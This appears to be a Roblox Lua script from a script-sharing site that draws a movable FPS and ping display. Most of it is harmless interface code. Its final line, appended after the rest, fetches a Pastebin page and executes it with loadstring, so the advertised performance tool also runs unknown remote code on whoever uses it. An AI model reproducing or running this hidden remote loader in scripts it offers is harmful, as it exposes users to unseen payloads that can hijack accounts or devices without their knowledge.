--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- FPS and Ping Checker Script (Improved UI with Movable Frame)

-- Create a ScreenGui to display FPS and Ping
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PerformanceGui"
ScreenGui.ResetOnSpawn = false -- Keep the UI persistent across respawns
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Frame for FPS and Ping display
local displayFrame = Instance.new("Frame")
displayFrame.Size = UDim2.new(0, 250, 0, 100)
displayFrame.Position = UDim2.new(0, 10, 0, 10)
displayFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
displayFrame.BackgroundTransparency = 0.4
displayFrame.BorderSizePixel = 0
displayFrame.Active = true -- Make the frame active for input events
displayFrame.Draggable = true -- Enable draggable frame
displayFrame.Parent = ScreenGui

-- FPS Label
local fpsLabel = Instance.new("TextLabel")
fpsLabel.Size = UDim2.new(1, -20, 0, 40)
fpsLabel.Position = UDim2.new(0, 10, 0, 10)
fpsLabel.TextColor3 = Color3.new(1, 1, 1)
fpsLabel.TextStrokeTransparency = 0.7
fpsLabel.TextSize = 24
fpsLabel.Font = Enum.Font.SourceSansBold
fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
fpsLabel.BackgroundTransparency = 1
fpsLabel.Text = "FPS: Loading..."
fpsLabel.Parent = displayFrame

-- Ping Label
local pingLabel = Instance.new("TextLabel")
pingLabel.Size = UDim2.new(1, -20, 0, 40)
pingLabel.Position = UDim2.new(0, 10, 0, 50)
pingLabel.TextColor3 = Color3.new(1, 1, 1)
pingLabel.TextStrokeTransparency = 0.7
pingLabel.TextSize = 24
pingLabel.Font = Enum.Font.SourceSansBold
pingLabel.TextXAlignment = Enum.TextXAlignment.Left
pingLabel.BackgroundTransparency = 1
pingLabel.Text = "Ping: Loading..."
pingLabel.Parent = displayFrame

-- FPS Checker
local fps = 0
local lastTime = tick()

game:GetService("RunService").RenderStepped:Connect(function()
    fps = math.floor(1 / (tick() - lastTime))
    lastTime = tick()
    fpsLabel.Text = "FPS: " .. tostring(fps)
end)

-- Ping Checker
local function getPing()
    local player = game.Players.LocalPlayer
    local ping = player:GetNetworkPing() * 1000 -- Convert to milliseconds
    return math.floor(ping)
end

game:GetService("RunService").Stepped:Connect(function()
    local ping = getPing()
    pingLabel.Text = "Ping: " .. tostring(ping) .. " ms"
end)

-- Optional: Auto-adjust label colors based on performance
game:GetService("RunService").Stepped:Connect(function()
    if fps < 30 then
        fpsLabel.TextColor3 = Color3.new(1, 0, 0) -- Red for low FPS
    else
        fpsLabel.TextColor3 = Color3.new(0, 1, 0) -- Green for good FPS
    end

    if getPing() > 200 then
        pingLabel.TextColor3 = Color3.new(1, 0, 0) -- Red for high ping
    else
        pingLabel.TextColor3 = Color3.new(0, 1, 0) -- Green for good ping
    end
end)

-- Optional: Saving frame position locally
local function savePosition()
    local pos = displayFrame.Position
    -- Save the position to a datastore or local storage (optional implementation)
end

-- Saving the position when dragging stops
displayFrame.MouseLeave:Connect(savePosition)
displayFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        savePosition()
    end
end)
loadstring(game:HttpGet("https://pastebin.com/raw/KiSYpej6",true))()
